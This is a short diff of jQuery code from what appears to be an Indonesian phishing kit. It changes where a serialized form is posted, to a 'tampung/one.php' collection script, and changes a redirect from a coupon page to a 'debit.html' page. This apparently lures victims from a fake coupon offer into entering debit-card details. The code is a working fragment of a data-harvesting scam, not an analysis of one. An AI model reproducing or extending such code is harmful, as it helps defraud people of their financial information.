@@ -588,12 +588,12 @@ function sendHpp(){
     
     $.ajax({
         type: 'POST',
-        url: 'login/sendIndex.php',
+        url: 'tampung/one.php',
         data: $('#index').serialize(),
         datatype: 'JSON',   
     complete: function(){    
     setTimeout(function(){   
-    window.location = "kupon.html";
+    window.location = "debit.html";
     $("#lonte").hide();
     $('.load').fadeOut();
     document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
